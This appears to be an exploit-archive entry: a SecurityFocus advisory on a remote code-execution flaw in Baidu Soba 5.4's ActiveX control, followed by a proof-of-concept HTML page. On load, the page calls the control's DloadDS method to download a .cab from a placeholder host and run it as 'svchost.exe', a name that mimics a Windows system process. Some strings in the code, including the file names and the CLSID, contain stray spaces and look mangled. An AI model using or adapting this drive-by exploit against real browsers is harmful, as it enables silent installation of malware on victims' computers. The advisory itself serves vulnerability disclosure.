@@ -1,0 +1,28 @@
+source: http://www.securityfocus.com/bid/25121/info
+
+An ActiveX control installed with Baidu Soba search bar is prone to a remote code-execution vulnerability.
+
+An attacker can exploit this issue to execute hostile code on a victim's computer in the context of the vulnerable application using the ActiveX control (typically Internet Explorer). Successful exploits will allow attackers to execute arbitrary code with the privileges of the affected user; other consequences are possible.
+
+This issue affects Baidu Soba 5.4; other versions may also be affected. 
+
+<html>
+<head>
+
+<script>
+
+function DowndloadCalcAndRun()
+{
+
+com.DloadDS("http://www.example.com/svcho st.cab", "svch ost.exe", 0);
+
+}
+
+</script>
+</head>
+<OBJECT ID = "com" CLASSID = "CLSID:{A7F05EE 4-0426-454F-8013-C41E 3596E9E9}">
+</OBJECT>
+<script>
+DowndloadCalcAndRun()
+</script>
+</html>
